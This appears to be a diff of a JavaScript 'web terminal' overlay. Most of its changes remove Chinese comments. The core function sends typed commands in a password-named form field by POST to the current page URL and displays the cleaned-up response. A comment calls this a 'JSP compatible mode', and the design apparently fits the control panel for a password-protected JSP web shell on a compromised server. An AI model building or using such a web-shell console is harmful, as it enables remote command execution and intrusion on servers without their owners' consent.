@@ -75,12 +75,12 @@
         #wt-container.minimized #wt-header { pointer-events: auto; cursor: pointer; }
     `;
 
-    // 注入样式
+    
     const styleSheet = document.createElement("style");
     styleSheet.innerText = STYLES;
     document.head.appendChild(styleSheet);
 
-    // 创建 UI
+    
     const container = document.createElement('div');
     container.id = 'wt-container';
     container.innerHTML = `
@@ -107,17 +107,17 @@
     `;
     document.body.appendChild(container);
 
-    // 逻辑变量
+    
     const body = document.getElementById('wt-body');
     const input = document.getElementById('wt-input');
     const header = document.getElementById('wt-header');
     const minBtn = document.getElementById('wt-min-btn');
     let isMinimized = false;
 
-    // 默认最小化
+    
     toggleMinimize();
 
-    // 辅助函数：打印日志
+    
     function log(msg, type = 'sys') {
         const div = document.createElement('div');
         div.className = `log-line log-${type}`;
@@ -126,7 +126,7 @@
         body.scrollTop = body.scrollHeight;
     }
 
-    // 最小化功能
+    
     function toggleMinimize() {
         isMinimized = !isMinimized;
         if (isMinimized) container.classList.add('minimized');
@@ -135,35 +135,35 @@
     minBtn.addEventListener('click', (e) => { e.stopPropagation(); toggleMinimize(); });
     header.addEventListener('click', toggleMinimize);
 
-    // --- 拖拽逻辑 (100% 保留原版，未做任何修改) ---
+    
     let isDragging = false;
     let startX, startY, initialLeft, initialTop;
 
-        // 统一处理开始拖拽 (鼠标和触摸)
+        
         const startDrag = (e) => {
-            // 排除特定元素
+            
             if (e.target.classList.contains('wt-dot')) return;
 
             isDragging = true;
 
-            // 获取当前手指/鼠标坐标
+            
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
             const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
 
-            // 记录初始偏移量
+            
             startX = clientX - container.offsetLeft;
             startY = clientY - container.offsetTop;
 
-        // 防止移动端拖动时触发页面滚动
+        
           if (e.type.includes('touch')) {
        }
     };
 
-        // 统一处理移动过程
+        
         const onDrag = (e) => {
         if (!isDragging) return;
 
-        // 阻止默认滚动行为
+        
         e.preventDefault();
 
         const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
@@ -172,12 +172,12 @@
         container.style.left = (clientX - startX) + 'px';
         container.style.top = (clientY - startY) + 'px';
 
-        // 清除 bottom/right 以允许自由定位
+        
         container.style.bottom = 'auto';
         container.style.right = 'auto';
    };
 
-        // 统一处理结束拖拽
+        
         const stopDrag = () => {
         isDragging = false;
 
@@ -198,11 +198,11 @@
              document.addEventListener('touchend', stopDrag);
     // --- 拖拽逻辑结束 ---
 
-    // 核心发送逻辑 (已修改为JSP兼容模式)
+    
     async function sendCommand(cmd) {
         log(`> ${cmd}`, 'cmd');
 
-        // 内部指令处理
+        
         if (cmd.startsWith('/')) {
             const parts = cmd.split(' ');
             const action = parts[0].toLowerCase();
@@ -220,15 +220,13 @@
             return;
         }
 
-        // 使用 URLSearchParams 替代 FormData
-        // 发送 application/x-www-form-urlencoded 格式的数据
         const payload = new URLSearchParams();
         payload.append(CURRENT_PASS, cmd);
 
         try {
             const response = await fetch(window.location.href, {
                 method: 'POST',
-                // 明确指定内容类型
+                
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
                 },
@@ -239,7 +237,7 @@
 
             const text = await response.text();
 
-            // 清理 HTML 标签逻辑
+            
             let cleanText = text;
             if (text.includes('<html') || text.includes('<!DOCTYPE')) {
                  const parser = new DOMParser();
@@ -258,7 +256,7 @@
         }
     }
 
-    // 监听回车键
+    
     input.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') {
             const val = input.value.trim();
